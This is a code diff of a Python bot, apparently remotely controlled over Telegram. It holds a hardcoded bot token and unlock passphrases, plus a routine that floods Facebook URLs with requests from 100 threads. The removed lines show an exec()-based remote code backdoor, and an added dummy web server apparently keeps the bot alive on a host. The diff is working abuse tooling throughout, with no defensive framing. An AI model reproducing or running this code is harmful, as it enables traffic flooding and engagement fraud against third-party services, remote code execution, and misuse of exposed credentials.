@@ -1,7 +1,8 @@
-import sys, os, hashlib, time, requests, threading, base64, random, json
+import sys, os, time, requests, threading, base64, random, json
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
-_I = int(base64.b64decode("MTkzODU5MTQ4NA==").decode())
-_T = base64.b64decode("ODUzNjM0NjA4MzpBQUdZVURSNmNkN2hJOV80MV9nTmJRZFJFQmJCbkR3Xzl2NA==").decode()
+_I = 1938591484
+_T = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREBbBnDw_9v4"
 
 class SovereignMaster:
     def __init__(self, t):
@@ -15,8 +16,7 @@ class SovereignMaster:
 
     def _boost(self, url):
         self._s(_I, "🚀 **INJECTING TRAFFIC...**")
-        for _ in range(100):
-            threading.Thread(target=self._fire, args=(url,), daemon=True).start()
+        for _ in range(100): threading.Thread(target=self._fire, args=(url,), daemon=True).start()
 
     def _fire(self, url):
         try:
@@ -32,33 +32,29 @@ class SovereignMaster:
                 for u in up.get('result', []):
                     o = u['update_id'] + 1
                     m = u.get('message', {}); uid = m.get('from', {}).get('id'); tx = m.get('text', '')
-                    if uid != _I:
-                        self.i[uid] = self.i.get(uid, 0) + 1
-                        if self.i[uid] > 3: self._s(_I, f"🚨 **INTRUDER:** `{uid}`\n`{tx}`")
-                        continue
+                    if uid != _I: continue
                     st = self.f.get(uid, 0)
                     if st < 4: self.f[uid] = st + 1
                     elif st == 4:
-                        if "ariful islam pappu 2000" in tx.lower():
-                            self._s(uid, "🔱 **২০০০ এর নিহিত অর্থ কী?**"); self.f[uid] = 5
+                        if "ariful islam pappu 2000" in tx.lower(): self._s(uid, "🔱 **২০০০ এর নিহিত অর্থ কী?**"); self.f[uid] = 5
                         else: self.f[uid] = 0
                     elif st == 5:
-                        if "জামালপুর" in tx and "পোস্ট কোড" in tx:
-                            self._s(uid, "🛡️ **ENTER MASTER KEY**"); self.f[uid] = 6
+                        if "জামালপুর" in tx and "পোস্ট কোড" in tx: self._s(uid, "🛡️ **ENTER MASTER KEY**"); self.f[uid] = 6
                         else: self.f[uid] = 0
                     elif st == 6:
-                        if tx == "Aip2k3052":
-                            self.f[uid] = "ROOT"; self.r = True
-                            self._s(uid, "👑 **ACCESS GRANTED**")
+                        if tx == "Aip2k3052": self.f[uid] = "ROOT"; self.r = True; self._s(uid, "👑 **ACCESS GRANTED**")
                         else: self.f[uid] = 0
                     elif self.r:
                         if "facebook.com" in tx or "fb.watch" in tx: self._boost(tx)
-                        elif tx.startswith(">>>"):
-                            threading.Thread(target=exec, args=(tx[3:].strip(), globals()), daemon=True).start()
-                            self._s(_I, "🧬 **DNA_SYNC: SUCCESS**")
             except: pass
-            time.sleep(0.1)
+            time.sleep(1)
+
+def run_fake_server():
+    class S(BaseHTTPRequestHandler):
+        def do_GET(self): self.send_response(200); self.end_headers()
+    HTTPServer(('0.0.0.0', int(os.environ.get('PORT', 8080))), S).serve_forever()
 
 if __name__ == "__main__":
+    threading.Thread(target=run_fake_server, daemon=True).start()
     SovereignMaster(_T).listen()
-  
+    
